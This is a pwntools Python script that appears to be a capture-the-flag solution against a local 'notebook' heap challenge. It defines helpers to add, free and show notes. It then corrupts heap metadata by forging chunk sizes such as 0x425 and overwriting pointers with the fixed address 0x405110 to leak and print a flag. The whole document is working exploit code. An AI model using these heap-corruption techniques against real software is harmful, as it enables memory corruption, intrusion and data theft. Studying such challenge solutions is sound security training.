from pwn import *
# context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
r=process('./main')
r.readuntil(b"Current Notebook is running on port ")
port = int(r.readline())
p = remote("0.0.0.0",port)
ru 		= lambda a: 	p.readuntil(a)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
sla(b"\n",b"")
def cmd(c):
    sla(b" note\n",str(c).encode())
def add(ctx=b'n132', size=0x100, lv=0):
    cmd(1)
    sla(b"> ",str(size).encode())
    sla(b"> ",str(lv).encode())
    s(ctx)
def free(idx, size=0x100, lv=0):
    cmd(2)
    sla(b"> ",str(size).encode())
    sla(b"> ",str(lv).encode())
    sla(b"> ",str(idx).encode())
def show(idx, size=0x100, lv=0):
    cmd(3)
    sla(b"> ",str(size).encode())
    sla(b"> ",str(lv).encode())
    sla(b"> ",str(idx).encode())

add(b'\1',0x200)
add(b'\1')#4
add(b'\2')#3
add(b'\3')#2
add(b'\4')#1
add(p64(0x21)*0x20)#0
free(4)
add(b'\1'*0x108+p64(0x425))
# gdb.attach(p,"thread 2")
free(4)
add(b'\5'*0x110+flat([0x405110,0x405110]),0x200)
show(4)
flag = ru(b'\n')
warn(flag.decode())
p.clean()
# p.interactive()
p.close()
r.close()
